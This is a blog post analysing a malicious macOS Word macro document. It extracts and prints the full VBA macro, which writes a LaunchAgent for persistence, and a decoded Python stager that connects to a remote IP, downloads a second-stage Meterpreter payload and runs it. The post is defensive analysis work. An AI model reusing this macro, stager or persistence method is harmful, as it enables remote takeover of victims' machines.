---
title: iScam:When a Word Document Wields More Than Just Words
author: Vishal Chand
date: 2025-01-22
categories: [Malware Analysis]
tags: [MacOS,Word Document]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/posts/11.png
---
Malware sample : [Click me](https://objective-see.com/downloads/blog/blog_0x3A/BitcoinQuestions.zip)

First let's confirm file type by using `file` command.

![file type](/assets/img/posts/13.png)

So it's a word document!

Now let put this up in [Virus Total](https://www.virustotal.com/gui/) 

![md5](/assets/img/posts/12.png)

> Word documents are actually compressed archives (containing XML files).Which means we can “unzip” the document to view its contents.
{: .prompt-info }

![unzip](/assets/img/posts/14.png)

> VBA macros [in a Word Document] are usually stored in a binary `OLE file` within the compressed archive, called vbaProject.bin
{: .prompt-info }

In above picture we can see the presence of `vbaProject.bin`, which means Word document contains macros!

To extract embedded macros we can use clamAV's `sigtool`. vbaProject.bin a binary OLE file.

You can install clamAV via the following:
```shell
brew install clamav
```
> Executing sigtool with the --vba flag, extracts the embedded macros from the word/vbaProject.bin
{: .prompt-tip } 

```shell
bornpresident@President-iMac Downloads % sigtool --vba word/vbaProject.bin 
-------------- start of code ------------------
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

-------------- end of code ------------------


-------------- start of code ------------------
Attribute VB_Name = "NewMacros"
Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String, ByVal mode As String) As LongPtr
Private Sub Document_Open()
Dim path As String
Dim payload As String
payload = "import base64,sys;exec(base64.b64decode({2:str,3:lambda ... }[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ" & _
"1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29" & _
"ubmVjdCgoJzEwOS4yMDIuMTA3LjIwJyw5NjIyKSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWN" & _
"rKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')));"
path = Environ("HOME") & "/../../../../Library/LaunchAgents/~$com.xpnsec.plist"
arg = "<?xml version=""1.0"" encoding=""UTF-8""?>\n" & _
"<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n" & _
"<plist version=""1.0"">\n" & _
"<dict>\n" & _
"<key>Label</key>\n" & _
"<string>com.xpnsec.sandbox</string>\n" & _
"<key>ProgramArguments</key>\n" & _
"<array>\n" & _
"<string>python</string>\n" & _
"<string>-c</string>\n" & _
"<string>" & payload & "</string>" & _
"</array>\n" & _
"<key>RunAtLoad</key>\n" & _
"<true/>\n" & _
"</dict>\n" & _
"</plist>"
Result = system("echo """ & arg & """ > '" & path & "'", "r")
'Result = system("launchctl bootout gui/$UID", "r")
End Sub
-------------- end of code ------------------
```
`Private Sub Document_Open()`event occurs when a document is opened.So, the Visual Basic macro code within the in the Document_Open() subroutine will be executed when the malicious Word document,BitcoinMagazine-Quidax_InterviewQuestions_2018.docm, is opened.

So what does the code in the Document_Open() subroutine do?

1. Decodes a chunk (of what appears to be python) code into a variable named payload.
2. Builds a path to a launch agent plist…in a rather interesting manner.
3. Builds a launch agent plist (com.xpnsec.plist) saving this into a variable named arg.
4. Saves said launch agent to disk, via the system command.
5. Forces a logout via launchctl bootout gui/$UID.

> It's not that easy to run macro code within a malicious document beacuse of `Word’s sandbox` but it can bt bypassed. Please refer:[Escaping the Microsoft Office Sandbox](https://objective-see.com/blog/blog_0x35.html)
{: .prompt-info }

#### Decoding python shell
```python
$ python
>>> import base64
>>> payload = "aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5n...30pCg=="
>>> base64.b64decode(payload)

"import socket,struct,time\nfor x in range(10):\n\ttry:\n\t\ts=socket.socket(2,socket.SOCK_STREAM)\n\t\ts.connect(('109.202.107.20',9622))\n\t\tbreak\n\texcept:\n\t\ttime.sleep(5)\nl=struct.unpack('>I',s.recv(4))[0]\nd=s.recv(l)\nwhile len(d)<l:\n\td+=s.recv(l-len(d))\nexec(d,{'s':s})\n"
```
```python
import socket, struct, time

for x in range(10):
  try:
    s=socket.socket(2,socket.SOCK_STREAM)
    s.connect(('109.202.107.20',9622))        //Tries to connect a server at 109.202.107.20 on port 9622 for 10 times
    break
  except:
    time.sleep(5)

l=struct.unpack('>I',s.recv(4))[0]  //Receives 4 bytes from the server (this is variable length of the rest of the payload)
d=s.recv(l)

while len(d)<l:
  d+=s.recv(l-len(d))

exec(d,{'s':s})  //Executes the payload (our 2nd payload)
```
#### Stage 2

```python
$ python download.py 

#!/usr/bin/python
import binascii
import code
import os
import platform

...

try:
    import ctypes
except ImportError:
    has_windll = False
else:
    has_windll = hasattr(ctypes, 'windll')

...

#@export
class MeterpreterChannel(object):
    def core_close(self, request, response):
        self.close()
        return ERROR_SUCCESS, response

...

#@export
class MeterpreterFile(MeterpreterChannel):
    def __init__(self, file_obj):
        self.file_obj = file_obj
        super(MeterpreterFile, self).__init__()

...

#@export
class MeterpreterProcess(MeterpreterChannel):
    def __init__(self, proc_h):

...
```
2nd stage payload is meterpreter. 




